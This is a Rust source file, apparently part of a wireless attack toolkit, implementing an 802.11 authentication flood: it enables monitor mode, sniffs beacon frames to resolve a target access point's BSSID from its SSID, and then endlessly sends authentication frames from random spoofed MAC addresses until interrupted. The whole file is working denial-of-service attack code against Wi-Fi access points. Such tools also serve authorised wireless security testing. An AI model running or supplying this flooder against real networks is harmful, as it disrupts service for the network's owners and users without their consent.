use std::sync::atomic::{AtomicBool, Ordering};
use std::{thread, time::Duration};
use std::sync::Arc;
use libc;
use crate::arg_parser::{AuthArgs, parse_mac};
use crate::dissectors::BeaconDissector;
use crate::generators::RandValues;
use crate::iface::InterfaceManager;
use crate::pkt_builder::PacketBuilder;
use crate::sniffer::PacketSniffer;
use crate::sockets::Layer2RawSocket;
use crate::utils::{abort, inline_display};



pub struct AuthenticationFlooder {
    args: AuthArgs,
}



impl AuthenticationFlooder {

    pub fn new(args: AuthArgs) -> Self {
        Self { args }
    }



    pub fn execute(&mut self) {
        InterfaceManager::enable_monitor_mode(&self.args.iface);
        
        let bssid = self.args.bssid.unwrap_or_else(|| self.resolve_bssid());
        self.send_endlessly(bssid);
        
        InterfaceManager::disable_monitor_mode(&self.args.iface);
    }



    fn resolve_bssid(&mut self) -> [u8; 6] {
        let beacons = self.get_beacons();
        self.process_beacons(beacons)
    }



    fn get_beacons(&mut self) -> Vec<Vec<u8>> {
        let mut sniffer = PacketSniffer::new(
            self.args.iface.clone(), 
            "type mgt and subtype beacon".to_string()
        );
        
        sniffer.start();
        thread::sleep(Duration::from_secs(2));
        sniffer.stop();

        sniffer.get_packets()
    }



    fn process_beacons(&self, beacons: Vec<Vec<u8>>) -> [u8; 6] {
        for b in beacons {
            if let Some(info) = BeaconDissector::parse_beacon(&b) {
                if info[0] == self.args.ssid {
                    return parse_mac(&info[1]).unwrap();
                }
            }
        }
        
        abort("It was not possible to resolve BSSID. Try again or set a BSSID")
    }



    fn send_endlessly(&self, bssid: [u8; 6]) {
        let mut rand    = RandValues::new();
        let mut builder = PacketBuilder::new();
        let socket      = Layer2RawSocket::new(&self.args.iface);        
        let running     = Arc::new(AtomicBool::new(true));
        Self::setup_ctrl_c_handler(running.clone());

        let mut sent: usize = 0;
        while running.load(Ordering::SeqCst) {
            let pkt = builder.auth_802_11(rand.get_random_mac(), bssid);
            socket.send(pkt);
            sent += 1;
            Self::display_progress(sent);
            
            thread::sleep(Duration::from_millis(1));
        }
    }



    fn display_progress(sent: usize) {
        let msg: String = format!("Packets sent: {}", &sent);
        inline_display(msg);
    }



    fn setup_ctrl_c_handler(running: Arc<AtomicBool>) {
        unsafe {
            let mut mask: libc::sigset_t = std::mem::zeroed();
            libc::sigemptyset(&mut mask);
            libc::sigaddset(&mut mask, libc::SIGINT);
            
            libc::pthread_sigmask(libc::SIG_BLOCK, &mask, std::ptr::null_mut());
            
            let fd = libc::signalfd(-1, &mask, 0);
            
            thread::spawn(move || {
                let mut fds = libc::pollfd {
                    fd,
                    events: libc::POLLIN,
                    revents: 0,
                };
                
                while libc::poll(&mut fds, 1, -1) > 0 {
                    if fds.revents & libc::POLLIN == 0 {
                        continue;
                    }

                    let mut info: libc::signalfd_siginfo = std::mem::zeroed();
                    let size = std::mem::size_of::<libc::signalfd_siginfo>();
                    
                    if libc::read(fd, &mut info as *mut _ as *mut libc::c_void, size) != size as isize {
                        continue;
                    }

                    if info.ssi_signo != libc::SIGINT as u32 {
                        continue;
                    }

                    running.store(false, Ordering::SeqCst);
                    break;
                }

                libc::close(fd);
            });
        }
    }

}